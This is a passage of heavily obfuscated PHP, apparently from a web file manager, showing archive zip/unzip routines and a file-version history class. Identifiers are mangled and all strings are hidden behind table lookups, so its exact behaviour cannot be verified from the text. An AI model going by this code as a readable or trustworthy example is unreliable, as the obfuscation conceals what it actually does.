(!$Ü¦ıßµ¨ || !$Ü¦ıßµ¨[$õ¯’¥Ü[229]]) { show_json(LNG($õ¯’¥Ü[1226]), !1); } $ ûª“¿Â = self::zipFileList($ØãÀÌâ, $°î¦¯ˆ¡); foreach ($ ûª“¿Â as $ÍÌ¦‚ã‡ => $°âÎûó) { $ ûª“¿Â[$ÍÌ¦‚ã‡] = self::iconvSystem($°âÎûó); } $°ÄÊÕ‰‡ = get_filename_auto($À¥Ğ°¥¸ . $«Îé„ÚÄ, $õ¯’¥Ü[22], $ˆÓÁ¨Á·); KodArchive::create(self::iconvSystem($°ÄÊÕ‰‡), $ ûª“¿Â); if (!IO::exist($°ÄÊÕ‰‡)) { if ($°î¦¯ˆ¡) { del_dir($°î¦¯ˆ¡); } show_json(LNG($õ¯’¥Ü[1227]), !1); } if (!$°î¦¯ˆ¡) { return $°ÄÊÕ‰‡; } $–™•’µá = self::move($°ÄÊÕ‰‡, $°öê§Ş, $ˆÓÁ¨Á·); if ($°î¦¯ˆ¡) { del_dir($°î¦¯ˆ¡); } if (!$°ÄÊÕ‰‡) { show_json(LNG($õ¯’¥Ü[1227]), !1); } return $–™•’µá; } public static function unzip($¨ù¾ç¿, $âïè´, $Öö±ä¤Á = "\55\x31", $–Ï±ÏËƒ = "\162\x65\160\154\x61\143\145") { $ëøŠ¢«» =& $_SERVER[•€áå–Õ]; $‘Ø×„§¯ = parent::info($¨ù¾ç¿); if (!$‘Ø×„§¯) { show_json(LNG($ëøŠ¢«»[1228]), !1); } $¸±¥“è = IO::infoFullSimple($âïè´); if (!$¸±¥“è) { $âïè´ = IO::mkdir($âïè´); } if (isset($¸±¥“è[$ëøŠ¢«»[193]]) && trim($¸±¥“è[$ëøŠ¢«»[96]], $ëøŠ¢«»[18]) != trim($âïè´, $ëøŠ¢«»[18])) { $§Úı”Ã = KodIO::make($¸±¥“è[$ëøŠ¢«»[192]]); $îˆ‰½ € = IO::fileNameAuto($§Úı”Ã, $¸±¥“è[$ëøŠ¢«»[42]], REPEAT_RENAME_FOLDER, !0); $âïè´ = IO::mkdir($§Úı”Ã . $îˆ‰½ €); } $Öö±ä¤Á = $Öö±ä¤Á && $Öö±ä¤Á != $ëøŠ¢«»[1229] ? @json_decode($Öö±ä¤Á, !0) : -1; $ıˆ¨ÚŞ = self::unzipPart($¨ù¾ç¿, $Öö±ä¤Á); if (!$ıˆ¨ÚŞ || !IO::exist($ıˆ¨ÚŞ[$ëøŠ¢«»[226]])) { show_json(LNG($ëøŠ¢«»[117]), !1); } $„“Ç©·ä = $ıˆ¨ÚŞ[$ëøŠ¢«»[1230]][count($ıˆ¨ÚŞ[$ëøŠ¢«»[1230]]) - 1]; if ($„“Ç©·ä[$ëøŠ¢«»[1231]] == -1 || substr($„“Ç©·ä[$ëøŠ¢«»[42]], -1, 1) == $ëøŠ¢«»[18]) { $ÀÂ÷Î‹Ê = $ıˆ¨ÚŞ[$ëøŠ¢«»[1232]] . rand_string(10) . $ëøŠ¢«»[18]; mk_dir($ÀÂ÷Î‹Ê); $¥°¥¥ôÜ = count($ıˆ¨ÚŞ[$ëøŠ¢«»[1230]]) == 1 ? IO::ext($¨ù¾ç¿) : get_path_ext($ıˆ¨ÚŞ[$ëøŠ¢«»[226]]); $‘è¢·îˆ = KodArchive::extract(self::iconvSystem($ıˆ¨ÚŞ[$ëøŠ¢«»[226]]), $ÀÂ÷Î‹Ê, $„“Ç©·ä[$ëøŠ¢«»[1231]], $îˆ‰½ €, $¥°¥¥ôÜ); self::unzipErrorCheck($‘è¢·îˆ, array($ëøŠ¢«»[1233], $¨ù¾ç¿, $¥°¥¥ôÜ, $âïè´, $ıˆ¨ÚŞ)); Hook::trigger($ëøŠ¢«»[1234], $ÀÂ÷Î‹Ê); recursion_dir($ÀÂ÷Î‹Ê, $÷‚ÈÊ¾¢, $Ûó¨ì™Ä, 0); $¼ÂêÍ†‡ = array_merge($÷‚ÈÊ¾¢, $Ûó¨ì™Ä); $‡“¾©¼ = array(); foreach ($¼ÂêÍ†‡ as $³üèçÈƒ) { $¦ã×¬’ = IO::move(self::iconvApp($³üèçÈƒ), $âïè´, $–Ï±ÏËƒ); if ($¦ã×¬’) { $‡“¾©¼[] = $¦ã×¬’; } } del_dir($ÀÂ÷Î‹Ê); } else { $¦ã×¬’ = IO::move($ıˆ¨ÚŞ[$ëøŠ¢«»[226]], $âïè´, $–Ï±ÏËƒ, get_path_this($„“Ç©·ä[$ëøŠ¢«»[42]])); if ($¦ã×¬’) { $‡“¾©¼[] = $¦ã×¬’; } } return $‡“¾©¼ ? $‡“¾©¼ : !1; } public static function unzipList($ğâƒ¹Ü³) { $–°ÉÌÛ— =& $_SERVER[•€áå–Õ]; $ÌÚŒ‰³Ç = isset($ğâƒ¹Ü³[$–°ÉÌÛ—[1235]]) ? $ğâƒ¹Ü³[$–°ÉÌÛ—[1235]] : !1; $ü¼ğ’ùÓ = isset($ğâƒ¹Ü³[$–°ÉÌÛ—[1231]]) ? @json_decode($ğâƒ¹Ü³[$–°ÉÌÛ—[1231]], !0) : -1; $öµé±âó = self::unzipPart($ğâƒ¹Ü³[$–°ÉÌÛ—[96]], $ü¼ğ’ùÓ); if (!$öµé±âó || !IO::exist($öµé±âó[$–°ÉÌÛ—[226]])) { show_json(LNG($–°ÉÌÛ—[117]), !1); } $²Šö®ğ = $öµé±âó[$–°ÉÌÛ—[1230]][count($öµé±âó[$–°ÉÌÛ—[1230]]) - 1]; $–™óùÛˆ = in_array(IO::ext($öµé±âó[$–°ÉÌÛ—[226]]), array($–°ÉÌÛ—[368], $–°ÉÌÛ—[1236], $–°ÉÌÛ—[1237], $–°ÉÌÛ—[1238], $–°ÉÌÛ—[1239], $–°ÉÌÛ—[1240])); if (!$ÌÚŒ‰³Ç && ($²Šö®ğ[$–°ÉÌÛ—[1231]] == -1 || $–™óùÛˆ)) { $•“®ºßç = $öµé±âó[$–°ÉÌÛ—[1232]] . get_path_this($öµé±âó[$–°ÉÌÛ—[226]]) . $–°ÉÌÛ—[1241]; if (!IO::exist($•“®ºßç)) { $ä¾Ü±Ø = $²Šö®ğ[$–°ÉÌÛ—[1231]] == -1 ? get_path_ext(IO::pathThis($ğâƒ¹Ü³[$–°ÉÌÛ—[96]])) : get_path_ext($öµé±âó[$–°ÉÌÛ—[226]]); $¡ÈçÀûú = KodArchive::listContent(self::iconvSystem($öµé±âó[$–°ÉÌÛ—[226]]), !0, $ä¾Ü±Ø); self::unzipErrorCheck($¡ÈçÀûú, array($–°ÉÌÛ—[1242], $ğâƒ¹Ü³, $öµé±âó)); @file_put_contents($•“®ºßç, json_encode($¡ÈçÀûú[$–°ÉÌÛ—[1243]])); } return @json_decode(IO::getContent($•“®ºßç), !0); } IO::fileOut($öµé±âó[$–°ÉÌÛ—[226]], $ÌÚŒ‰³Ç, get_path_this($²Šö®ğ[$–°ÉÌÛ—[42]])); die; } private static function zipFileList($ş½©©ä, $‰ø¾˜ÕÉ = false) { $åôí´Šï =& $_SERVER[•€áå–Õ]; $®ô˜š  = array(); foreach ($ş½©©ä as $ßîÄ§‹Õ) { $³˜ƒòÈ = $ßîÄ§‹Õ[$åôí´Šï[96]]; if ($‰ø¾˜ÕÉ) { $³˜ƒòÈ = self::copy($ßîÄ§‹Õ[$åôí´Šï[96]], $‰ø¾˜ÕÉ, $åôí´Šï[859]); } else { $ú›òúôĞ = self::init($ßîÄ§‹Õ[$åôí´Šï[96]]); if ($ú›òúôĞ->getType() == $åôí´Šï[118]) { $³˜ƒòÈ = $ú›òúôĞ->path; } } if ($³˜ƒòÈ && self::local()->exist($³˜ƒòÈ)) { $®ô˜š [$ßîÄ§‹Õ[$åôí´Šï[96]]] = $³˜ƒòÈ; } } if (!empty($®ô˜š )) { return array_values($®ô˜š ); } show_json(LNG($åôí´Šï[1206]), !1); } private static function localFilePath($ê³ì“²›) { $¹àõÍší =& $_SERVER[•€áå–Õ]; $¿§á¦° = KodIO::parse($ê³ì“²›); if ($¿§á¦°[$¹àõÍší[43]] == KodIO::KOD_SOURCE) { $Ğ»¤É²­ = Model($¹àõÍší[866])->fileInfoGet(KodIO::sourceID($ê³ì“²›)); if (!$Ğ»¤É²­[$¹àõÍší[96]]) { show_json($¹àõÍší[1244], !1); } $ê³ì“²› = $Ğ»¤É²­[$¹àõÍší[96]]; } $ ¡İÑ†Á = self::init($ê³ì“²›); if ($ ¡İÑ†Á->pathParse[$¹àõÍší[1192]]) { $ê³ì“²› = $ ¡İÑ†Á->pathParse[$¹àõÍší[1192]]; $ ¡İÑ†Á = self::init($ê³ì“²›); } $ÓğŒ¯©Ü = $ ¡İÑ†Á->getType(); if ($ÓğŒ¯©Ü == $¹àõÍší[118] || $ÓğŒ¯©Ü == $¹àõÍší[1245]) { if (!$ ¡İÑ†Á->exist($ ¡İÑ†Á->path)) { show_json(LNG($¹àõÍší[117]), !1); } return $ ¡İÑ†Á->path; } return !1; } public static function unzipPart($É³Ëûı, $Ò™Ù¡Ã… = -1) { $Ò¥ï¾À« =& $_SERVER[•€áå–Õ]; $ÁûöÕ“® = IO::pathThis($É³Ëûı); if (!$Ò™Ù¡Ã… || $Ò™Ù¡Ã… == -1) { $ğªÏ¦ı = array(array($Ò¥ï¾À«[42] => $ÁûöÕ“®, $Ò¥ï¾À«[1231] => -1)); $ğªÏ¦ı[0][$Ò¥ï¾À«[1246]] = $ğªÏ¦ı[0][$Ò¥ï¾À«[42]]; } else { if (is_array($Ò™Ù¡Ã…)) { $ğªÏ¦ı = $Ò™Ù¡Ã…; $™È¹æÊ¶ = count($ğªÏ¦ı) - 1; for ($¯¹«”‘ü = 0; $¯¹«”‘ü <= $™È¹æÊ¶; $¯¹«”‘ü++) { $Á± ÙÉ† = $ğªÏ¦ı[$¯¹«”‘ü]; $¯ñÀí… = get_path_this($Á± ÙÉ†[$Ò¥ï¾À«[42]]) . (checkExtSafe($Á± ÙÉ†[$Ò¥ï¾À«[42]]) ? $Ò¥ï¾À«[22] : $Ò¥ï¾À«[1247]); $ğªÏ¦ı[$¯¹«”‘ü][$Ò¥ï¾À«[1246]] = $Ò¥ï¾À«[1248] . intval($Á± ÙÉ†[$Ò¥ï¾À«[1231]]) . $Ò¥ï¾À«[441] . $¯ñÀí…; if ($¯¹«”‘ü == 0) { continue; } $ğªÏ¦ı[$¯¹«”‘ü][$Ò¥ï¾À«[1246]] = $ğªÏ¦ı[$¯¹«”‘ü - 1][$Ò¥ï¾À«[1246]] . $Ò¥ï¾À«[1249] . $ğªÏ¦ı[$¯¹«”‘ü][$Ò¥ï¾À«[1246]]; } } } if (!is_array($ğªÏ¦ı) || count($ğªÏ¦ı) == 0) { return !1; } $ûà¼¶è™ = $ğªÏ¦ı[count($ğªÏ¦ı) - 1]; if (!IO::exist($É³Ëûı)) { return !1; } $”âªó­ = TEMP_FILES . $Ò¥ï¾À«[1250] . kodIO::hashPathSafe($É³Ëûı) . $Ò¥ï¾À«[18]; $Ë¨Íüë¬ = $”âªó­ . $ûà¼¶è™[$Ò¥ï¾À«[1246]]; mk_dir($”âªó­); file_put_contents(TEMP_FILES . $Ò¥ï¾À«[1225], $Ò¥ï¾À«[22]); if (IO::exist($Ë¨Íüë¬)) { return array($Ò¥ï¾À«[226] => $Ë¨Íüë¬, $Ò¥ï¾À«[1230] => $ğªÏ¦ı, $Ò¥ï¾À«[1232] => $”âªó­); } $»»·›—Š = self::localFilePath($É³Ëûı); if (!$»»·›—Š) { $»»·›—Š = $”âªó­ . $Ò¥ï¾À«[1251]; if (!IO::exist($»»·›—Š)) { self::copy($É³Ëûı, $”âªó­, !1, get_path_this($»»·›—Š)); } } if (!$»»·›—Š || !IO::exist($»»·›—Š)) { return !1; } if ($ûà¼¶è™[$Ò¥ï¾À«[1231]] == -1) { return array($Ò¥ï¾À«[226] => $»»·›—Š, $Ò¥ï¾À«[1230] => $ğªÏ¦ı, $Ò¥ï¾À«[1232] => $”âªó­); } $¸É›ï¿¡ = $»»·›—Š; foreach ($ğªÏ¦ı as $¯¹«”‘ü => $Á± ÙÉ†) { if (!$Á± ÙÉ† || $Á± ÙÉ†[$Ò¥ï¾À«[1231]] == $Ò¥ï¾À«[1229]) { break; } if (substr($Á± ÙÉ†[$Ò¥ï¾À«[42]], -1, 1) == $Ò¥ï¾À«[18]) { break; } $‡—Ï¸ = in_array(get_path_ext($Á± ÙÉ†[$Ò¥ï¾À«[1246]]), array($Ò¥ï¾À«[368], $Ò¥ï¾À«[1236], $Ò¥ï¾À«[1237], $Ò¥ï¾À«[1238], $Ò¥ï¾À«[1239], $Ò¥ï¾À«[1240])); $Í¡î„Ë» = $¯¹«”‘ü == count($ğªÏ¦ı) - 1 && $‡—Ï¸; $‡ø·º¡ = $”âªó­ . $Á± ÙÉ†[$Ò¥ï¾À«[1246]]; $Æí¬‰Ø¢ = $”âªó­ . get_path_this($Á± ÙÉ†[$Ò¥ï¾À«[42]]); if (IO::exist($‡ø·º¡)) { $¸É›ï¿¡ = $‡ø·º¡; continue; } $‚´‹ü£— = $¯¹«”‘ü == 0 ? get_path_ext($ÁûöÕ“®) : get_path_ext($¸É›ï¿¡); $íçäæÏµ = KodArchive::extract(self::iconvSystem($¸É›ï¿¡), $”âªó­, $Á± ÙÉ†[$Ò¥ï¾À«[1231]], $‹ê³›ÏŸ, $‚´‹ü£—); self::unzipErrorCheck($íçäæÏµ, array($Ò¥ï¾À«[1252], $É³Ëûı, $ğªÏ¦ı, $Á± ÙÉ†, $‡ø·º¡)); if (IO::exist($Æí¬‰Ø¢)) { IO::rename($Æí¬‰Ø¢, get_path_this($‡ø·º¡)); } $¸É›ï¿¡ = $‡ø·º¡; } $Ë¨Íüë¬ = $¸É›ï¿¡; return array($Ò¥ï¾À«[226] => $¸É›ï¿¡, $Ò¥ï¾À«[1230] => $ğªÏ¦ı, $Ò¥ï¾À«[1232] => $”âªó­); } private static function unzipErrorCheck($ç¹ãøÛª, $ì–óÃãÖ = false) { $ğò»¶Ê =& $_SERVER[•€áå–Õ]; if ($ç¹ãøÛª[$ğò»¶Ê[1253]]) { return !0; } write_log(array($ğò»¶Ê[1254], $ç¹ãøÛª, $ì–óÃãÖ), $ğò»¶Ê[1255]); show_json($ğò»¶Ê[1256] . json_encode($ç¹ãøÛª[$ğò»¶Ê[1243]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¹Âï =& $_SERVER[•€áå–Õ]; $º×õ§ã‰ = $GLOBALS[$¹Âï[16]][$¹Âï[101]]; if ($º×õ§ã‰[$¹Âï[1257]] != 1) { return; } if ($º×õ§ã‰[$¹Âï[1258]] <= 0) { return; } if (isset($_REQUEST[$¹Âï[1259]]) && $_REQUEST[$¹Âï[1259]] == $¹Âï[100]) { return; } Hook::bind($¹Âï[1260], $¹Âï[1261]); Hook::bind($¹Âï[1262], $¹Âï[1263]); Hook::bind($¹Âï[1264], $¹Âï[1265]); Hook::bind($¹Âï[1266], $¹Âï[1267]); Hook::bind($¹Âï[1268], $¹Âï[1269]); Hook::bind($¹Âï[1270], $¹Âï[1271]); } public static function eventBeforeUpload($ëŞâ³¦‹) { if ($ëŞâ³¦‹[3] && $ëŞâ³¦‹[3] != REPEAT_REPLACE) { return; } $Åå²á¥Ë = self::parsePath($ëŞâ³¦‹[0]); if (!$Åå²á¥Ë) { return; } self::add($Åå²á¥Ë); } public static function eventBeforeEdit($öÊØ€¡¿) { $Ï·î‰–· = self::parsePath($öÊØ€¡¿[0]); if (!$Ï·î‰–·) { return; } self::add($Ï·î‰–·); } public static function eventBeforeCopyFile($“»«³„, $ı‹£·•Ã, $²İÄ¡Šî, $–“øñ¦’, $ºëëÕ±î, $Ò€¸­´) { $æÖÊïŒ =& $_SERVER[•€áå–Õ]; if (isset($²İÄ¡Šî->_data[$æÖÊïŒ[1196]]) && $²İÄ¡Šî->_data[$æÖÊïŒ[1196]]) { return; } $şÌÚìÚ = $²İÄ¡Šî->getPathOuter($–“øñ¦’); $¾ØÛö¬ = self::parsePath($şÌÚìÚ); if (!$¾ØÛö¬) { return; } self::add($¾ØÛö¬); } public static function eventBeforeRename($öã›´ğŒ) { $æõÉ‘é± =& $_SERVER[•€áå–Õ]; $±³áÆƒ = self::parsePath($öã›´ğŒ[0]); if (!$±³áÆƒ) { return; } $ü‡ÒÂ© = self::checkInHistory($±³áÆƒ); if (!$ü‡ÒÂ©) { return; } if ($ü‡ÒÂ©[$æõÉ‘é±[43]] == $æõÉ‘é±[226]) { $±ÑÜÕ» = self::listData($±³áÆƒ); if ($±ÑÜÕ» && $±ÑÜÕ»[$æõÉ‘é±[424]]) { self::moveHistory($±³áÆƒ, $öã›´ğŒ[1]); } } else { IO::rename($ü‡ÒÂ©[$æõÉ‘é±[96]], $öã›´ğŒ[1]); } } public static function eventBeforeMove($‹ºİËë) { $‰ÍÓŒèï =& $_SERVER[•€áå–Õ]; $Ûº÷ùØª = self::parsePath($‹ºİËë[0]); if (!$Ûº÷ùØª) { return; } $ß©ˆøë„ = self::parsePath($‹ºİËë[1]); if (!$ß©ˆøë„) { return; } $Ì×§çŸ = $‹ºİËë[3]; $ùÃ§Â¸á = self::checkInHistory($Ûº÷ùØª); if (!$ùÃ§Â¸á) { return; } $ËõëµĞß = self::pathHistory($ß©ˆøë„); if ($ùÃ§Â¸á[$‰ÍÓŒèï[43]] == $‰ÍÓŒèï[226]) { $¼íüÙÀŞ = self::listData($Ûº÷ùØª); $çûŞà½É = rtrim($ß©ˆøë„, $‰ÍÓŒèï[18]) . $‰ÍÓŒèï[18] . ($Ì×§çŸ ? $Ì×§çŸ : get_path_this($Ûº÷ùØª)); $âº†¤¼Ê = self::listData($çûŞà½É); if ($¼íüÙÀŞ && $¼íüÙÀŞ[$‰ÍÓŒèï[424]] && $âº†¤¼Ê && $âº†¤¼Ê[$‰ÍÓŒèï[424]]) { return self::clear($Ûº÷ùØª); } if ($¼íüÙÀŞ && $¼íüÙÀŞ[$‰ÍÓŒèï[424]]) { self::moveHistory($Ûº÷ùØª, $Ì×§çŸ, $ËõëµĞß); } } else { IO::move($ùÃ§Â¸á[$‰ÍÓŒèï[96]], $ËõëµĞß, !1, $Ì×§çŸ); self::clearEmptyFolder(IO::pathFather($ùÃ§Â¸á[$‰ÍÓŒèï[96]])); } } public static function eventAfterRemove($„Ü”·Æü, $¦ï–’ÄÆ) { $ˆ¸ÂÑÛì =& $_SERVER[•€áå–Õ]; if (!$¦ï–’ÄÆ) { return; } $œÜú© = self::parsePath($„Ü”·Æü[0]); if (!$œÜú©) { return; } $í€ÂŸ•„ = self::checkInHistory($œÜú©); if (!$í€ÂŸ•„) { return; } if ($í€ÂŸ•„[$ˆ¸ÂÑÛì[43]] == $ˆ¸ÂÑÛì[226]) { $Âóşé¤ = self::listData($œÜú©, !1); if ($Âóşé¤ && $Âóşé¤[$ˆ¸ÂÑÛì[424]]) { self::clear($œÜú©, !1); } } else { IO::remove($í€ÂŸ•„[$ˆ¸ÂÑÛì[96]]); self::clearEmptyFolder(IO::pathFather($í€ÂŸ•„[$ˆ¸ÂÑÛì[96]])); } } private static function checkInHistory($õ™û­­‚) { $à‘ó·áì = self::pathHistory($õ™û­­‚); if (!IO::exist($à‘ó·áì)) { $à‘ó·áì .= $_SERVER[•€áå–Õ][1272]; } return IO::exist($à‘ó·áì) ? IO::info($à‘ó·áì) : !1; } private static function parsePath($ôëÔ·ã) { $øüèûÊŸ =& $_SERVER[•€áå–Õ]; if (!$ôëÔ·ã) { return !1; } if ($GLOBALS[$øüèûÊŸ[1273]]) { return; } $ìàÄÒË‹ = KodIO::parse($ôëÔ·ã); $å¦ú‘•‡ = $ìàÄÒË‹[$øüèûÊŸ[43]]; $ë±‹‡Ÿ = !$å¦ú‘•‡ || $å¦ú‘•‡ == KodIO::KOD_IO || $å¦ú‘•‡ == KodIO::KOD_SHARE_ITEM; if (!$ë±‹‡Ÿ || !$ìàÄÒË‹[$øüèûÊŸ[1274]]) { return !1; } if (substr($ôëÔ·ã, 0, strlen(DATA_PATH . $øüèûÊŸ[1275])) == DATA_PATH . $øüèûÊŸ[1275]) { return !1; } if ($å¦ú‘•‡ == KodIO::KOD_SHARE_ITEM) { $·öÅƒ—Â = IO::init($ôëÔ·ã); if ($·öÅƒ—Â->pathParse[$øüèûÊŸ[1192]]) { return self::parsePath($·öÅƒ—Â->pathParse[$øüèûÊŸ[1192]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Çú‰óŞ£ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $øüèûÊŸ[1276]); foreach ($Çú‰óŞ£ as $îÌÍ–ƒ) { if (!$å¦ú‘•‡ && substr($ôëÔ·ã, 0, strlen($îÌÍ–ƒ)) == $îÌÍ–ƒ) { return !1; } } self::log($GLOBALS[$øüèûÊŸ[1187]] . $øüèûÊŸ[1277] . $ôëÔ·ã); return $ôëÔ·ã; } private static function pathHistory($ı×ñ„˜÷) { $™ì¢Ì§ğ =& $_SERVER[•€áå–Õ]; $â‚Âœ€ = self::$_historyBase . ltrim(KodIO::clear($ı×ñ„˜÷), $™ì¢Ì§ğ[18]); $â‚Âœ€ = str_replace(array($™ì¢Ì§ğ[1278]), array($™ì¢Ì§ğ[1279]), $â‚Âœ€); return $â‚Âœ€; } public static function log($¸¤³æ¢è) { } public static function historyCount($…šÇĞ‹) { $¢ŠÌÃñæ =& $_SERVER[•€áå–Õ]; $Õ×ğ¿õï = array(); $‡ç ¥øÄ = array(); foreach ($…šÇĞ‹ as $¥âÏĞ”Ö) { $Û§éÕÖ¡ = get_path_father($¥âÏĞ”Ö); if (!$‡ç ¥øÄ[$Û§éÕÖ¡]) { $‡ç ¥øÄ[$Û§éÕÖ¡] = array(); } $‡ç ¥øÄ[$Û§éÕÖ¡][] = get_path_this($¥âÏĞ”Ö); } foreach ($‡ç ¥øÄ as $Û§éÕÖ¡ => $­ë°±·Õ) { $‰ÎÏ±¢Â = self::parsePath($Û§éÕÖ¡); if (!$‰ÎÏ±¢Â) { continue; } foreach ($­ë°±·Õ as $´Ï¼ù³) { $µÂçş„¾ = self::listData(rtrim($‰ÎÏ±¢Â, $¢ŠÌÃñæ[18]) . $¢ŠÌÃñæ[18] . $´Ï¼ù³, !1); if ($µÂçş„¾ && $µÂçş„¾[$¢ŠÌÃñæ[424]]) { $Õ×ğ¿õï[rtrim($Û§éÕÖ¡, $¢ŠÌÃñæ[18]) . $¢ŠÌÃñæ[18] . $´Ï¼ù³] = count($µÂçş„¾[$¢ŠÌÃñæ[424]]); } } } return $Õ×ğ¿õï; } public static function add($ƒ‹ò£š) { $¥¯ØË”¨ =& $_SERVER[•€áå–Õ]; $ğ×°•éÈ = self::listData($ƒ‹ò£š); if (!$ğ×°•éÈ) { return; } $ôà­¸õ = Model($¥¯ØË”¨[811])->get($¥¯ØË”¨[1280]); $ŒåïÅ…’ = intval($GLOBALS[$¥¯ØË”¨[16]][$¥¯ØË”¨[101]][$¥¯ØË”¨[1258]]); $ÑÒı‹òø = $ôà­¸õ == $¥¯ØË”¨[1281] ? min(5, $ŒåïÅ…’) : $ŒåïÅ…’; if ($ŒåïÅ…’ <= 0) { return; } $­˜×æ™ = IO::info($ƒ‹ò£š); $–¦¥ÌÈ¶ = $ğ×°•éÈ[$¥¯ØË”¨[424]]; if ($­˜×æ™[$¥¯ØË”¨[88]] == 0) { return; } if ($­˜×æ™[$¥¯ØË”¨[88]] >= 1024 * 1024 * 500) { return !1; } $÷ÁÑñØà = IO::hashSimple($ƒ‹ò£š); if ($–¦¥ÌÈ¶ && $–¦¥ÌÈ¶[0][$¥¯ØË”¨[651]] == $÷ÁÑñØà) { return !0; } if (array_key_exists($¥¯ØË”¨[229], $­˜×æ™) && !$­˜×æ™[$¥¯ØË”¨[229]]) { return !1; } $ïšÆ¾·Ï = short_id(time()); $Åìß¯”‹ = array($¥¯ØË”¨[454] => $ïšÆ¾·Ï, $¥¯ØË”¨[651] => $÷ÁÑñØà, $¥¯ØË”¨[42] => $­˜×æ™[$¥¯ØË”¨[42]] . $¥¯ØË”¨[20] . date($¥¯ØË”¨[1282]) . rand_string(1), $¥¯ØË”¨[88] => $­˜×æ™[$¥¯ØË”¨[88]], $¥¯ØË”¨[506] => USER_ID, $¥¯ØË”¨[227] => time(), $¥¯ØË”¨[1283] => $¥¯ØË”¨[22]); IO::mkdir($ğ×°•éÈ[$¥¯ØË”¨[1284]]); $–‹½À‹ = IO::copy($ƒ‹ò£š, $ğ×°•éÈ[$¥¯ØË”¨[1284]], !1, $Åìß¯”‹[$¥¯ØË”¨[42]]); if (!$–‹½À‹) { self::clearEmptyFolder($ğ×°•éÈ[$¥¯ØË”¨[1284]]); return !1; } array_unshift($–¦¥ÌÈ¶, $Åìß¯”‹); if (count($–¦¥ÌÈ¶) > $ÑÒı‹òø) { $ÓÉøïÃ = array_slice($–¦¥ÌÈ¶, $ÑÒı‹òø); foreach ($ÓÉøïÃ as $ÅÅè€´Ç) { IO::remove($ğ×°•éÈ[$¥¯ØË”¨[1284]] . $ÅÅè€´Ç[$¥¯ØË”¨[42]]); } $–¦¥ÌÈ¶ = array_slice($–¦¥ÌÈ¶, 0, $ÑÒı‹òø); } return self::saveData($ğ×°•éÈ[$¥¯ØË”¨[1285]], $–¦¥ÌÈ¶); } public static function remove($«ÂÕ¹Ú©, $ƒàëíÉÆ) { $Üå¨¾Â÷ =& $_SERVER[•€áå–Õ]; $‹ñî©È¨ = self::listData($«ÂÕ¹Ú©); $â§ÛÏ¡ = array(); if (!$‹ñî©È¨) { return !1; } foreach ($‹ñî©È¨[$Üå¨¾Â÷[424]] as $Ú‰ãÍÉ) { if ($Ú‰ãÍÉ[$Üå¨¾Â÷[454]] == $ƒàëíÉÆ) { IO::remove($‹ñî©È¨[$Üå¨¾Â÷[1284]] . $Ú‰ãÍÉ[$Üå¨¾Â÷[42]]); continue; } $â§ÛÏ¡[] = $Ú‰ãÍÉ; } return self::saveData($‹ñî©È¨[$Üå¨¾Â÷[1285]], $â§ÛÏ¡); } public static function clear($¡¡õâĞ³, $Ö™£ô· = true) { $Œ‘–ºšÍ =& $_SERVER[•€áå–Õ]; $Ê×¡–²À = self::listData($¡¡õâĞ³, $Ö™£ô·); if (!$Ê×¡–²À) { return !1; } foreach ($Ê×¡–²À[$Œ‘–ºšÍ[424]] as $ıÛ—“ââ) { IO::remove($Ê×¡–²À[$Œ‘–ºšÍ[1284]] . $ıÛ—“ââ[$Œ‘–ºšÍ[42]]); } return self::saveData($Ê×¡–²À[$Œ‘–ºšÍ[1285]], array()); } public static function moveHistory($ìª¢–ÛÈ, $ÅíÒ¸ö = '', $©˜åõ¸é = '') { $­ŒÒõÆÄ =& $_SERVER[•€áå–Õ]; $áÀØÒÊì = self::listData($ìª¢–ÛÈ, !1); if (!$áÀØÒÊì || !$áÀØÒÊì[$­ŒÒõÆÄ[424]]) { return !1; } $íÁÚÓ‡ª = $­ŒÒõÆÄ[1272]; $ÅíÒ¸ö = $ÅíÒ¸ö ? $ÅíÒ¸ö : get_path_this($ìª¢–ÛÈ); $©˜åõ¸é = $©˜åõ¸é ? $©˜åõ¸é : $áÀØÒÊì[$­ŒÒõÆÄ[1284]]; $ÁˆÊ áÆ = substr(get_path_this($áÀØÒÊì[$­ŒÒõÆÄ[1285]]), 0, -strlen($íÁÚÓ‡ª)); foreach ($áÀØÒÊì[$­ŒÒõÆÄ[424]] as $æÂ–Ü¹ => $Æ˜ÃÀëá) { $ËÈ„ˆÆÉ = $ÅíÒ¸ö . substr($Æ˜ÃÀëá[$­ŒÒõÆÄ[42]], strlen($ÁˆÊ áÆ)); $í«šÖÍ´ = IO::move($áÀØÒÊì[$­ŒÒõÆÄ[1284]] . $Æ˜ÃÀëá[$­ŒÒõÆÄ[42]], $©˜åõ¸é, !1, $ËÈ„ˆÆÉ); if ($í«šÖÍ´) { $áÀØÒÊì[$­ŒÒõÆÄ[424]][$æÂ–Ü¹][$­ŒÒõÆÄ[42]] = $ËÈ„ˆÆÉ; } } $áÀØÒÊì[$­ŒÒõÆÄ[1285]] = IO::move($áÀØÒÊì[$­ŒÒõÆÄ[1285]], $©˜åõ¸é, !1, $ÅíÒ¸ö . $íÁÚÓ‡ª); self::saveData($áÀØÒÊì[$­ŒÒõÆÄ[1285]], $áÀØÒÊì[$­ŒÒõÆÄ[424]]); self::clearEmptyFolder($áÀØÒÊì[$­ŒÒõÆÄ[1284]]); } public static function rollback($Ó™Í¢’¼, $º‡´Íñó) { $ş­ã›„ =& $_SERVER[•€áå–Õ]; $èƒ©Ğ = self::listData($Ó™Í¢’¼); if (!$èƒ©Ğ) { return; } $»Ì„‹ë = IO::info($Ó™Í¢’¼); foreach ($èƒ©Ğ[$ş­ã›„[424]] as $ë­şÖ³ç => $òêìˆ«Û) { if ($òêìˆ«Û[$ş­ã›„[454]] == $º‡´Íñó) { self::add($Ó™Í¢’¼); $ùÅ¿Äğ‘ = $èƒ©Ğ[$ş­ã›„[1284]] . $òêìˆ«Û[$ş­ã›„[42]]; $™öÃĞÏÀ = IO::copy($ùÅ¿Äğ‘, IO::pathFather($Ó™Í¢’¼), REPEAT_REPLACE, $»Ì„‹ë[$ş­ã›„[42]]); if ($™öÃĞÏÀ) { self::remove($Ó™Í¢’¼, $º‡´Íñó); } return $™öÃĞÏÀ; } } return !1; } public static function setDetail($íÁºÕñ, $¯ä¤ Üê, $Ÿë÷ìÜÆ) { $ëä¬Á•’ =& $_SERVER[•€áå–Õ]; $Û…©à«Û = self::listData($íÁºÕñ); if (!$Û…©à«Û) { return; } foreach ($Û…©à«Û[$ëä¬Á•’[424]] as $¸Á‘ ­Ğ => $€’›êÕ‹) { if 